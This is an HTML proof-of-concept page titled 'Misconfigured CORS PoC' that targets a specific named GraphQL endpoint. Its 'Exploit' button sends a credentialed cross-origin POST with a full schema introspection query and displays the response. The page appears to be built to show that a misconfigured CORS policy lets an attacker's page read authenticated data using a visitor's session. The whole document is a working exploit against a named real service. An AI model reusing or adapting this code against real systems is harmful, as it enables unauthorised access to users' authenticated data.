<html>
     <body>
        <h2>Misconfigured CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
                var data = JSON.stringify({
                    "query": "{\n    __schema {\n        queryType {\n            name\n        }, mutationType {\n            name\n        }, types {\n            kind, name, description, fields(includeDeprecated: true) {\n                name, description, args {\n                    name, description, type {\n                        kind, name, ofType {\n                            kind, name, ofType {\n                                kind, name, ofType {\n                                    kind, name, ofType {\n                                        kind, name, ofType {\n                                            kind, name, ofType {\n                                                kind, name, ofType {\n                                                    kind, name\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }, defaultValue\n                }, type {\n                    kind, name, ofType {\n                        kind, name, ofType {\n                            kind, name, ofType {\n                                kind, name, ofType {\n                                    kind, name, ofType {\n                                        kind, name, ofType {\n                                            kind, name, ofType {\n                                                kind, name\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }, isDeprecated, deprecationReason\n            }, inputFields {\n                name, description, type {\n                    kind, name, ofType {\n                        kind, name, ofType {\n                            kind, name, ofType {\n                                kind, name, ofType {\n                                    kind, name, ofType {\n                                        kind, name, ofType {\n                                            kind, name, ofType {\n                                                kind, name\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }, defaultValue\n            }, interfaces {\n                kind, name, ofType {\n                    kind, name, ofType {\n                        kind, name, ofType {\n                            kind, name, ofType {\n                                kind, name, ofType {\n                                    kind, name, ofType {\n                                        kind, name, ofType {\n                                            kind, name\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }, enumValues(includeDeprecated: true) {\n                name, description, isDeprecated, deprecationReason, \n            }, possibleTypes {\n                kind, name, ofType {\n                    kind, name, ofType {\n                        kind, name, ofType {\n                            kind, name, ofType {\n                                kind, name, ofType {\n                                    kind, name, ofType {\n                                        kind, name, ofType {\n                                            kind, name\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }, directives {\n            name, description, locations, args {\n                name, description, type {\n                    kind, name, ofType {\n                        kind, name, ofType {\n                            kind, name, ofType {\n                                kind, name, ofType {\n                                    kind, name, ofType {\n                                        kind, name, ofType {\n                                            kind, name, ofType {\n                                                kind, name\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }, defaultValue\n            }\n        }\n    }\n}"
                });
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
            xhr.open("POST", "https://fe-event-service.parspec.xyz/v1/graphql", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.withCredentials = true;
            xhr.send(data);
             }
         </script>
     </body>
</html>
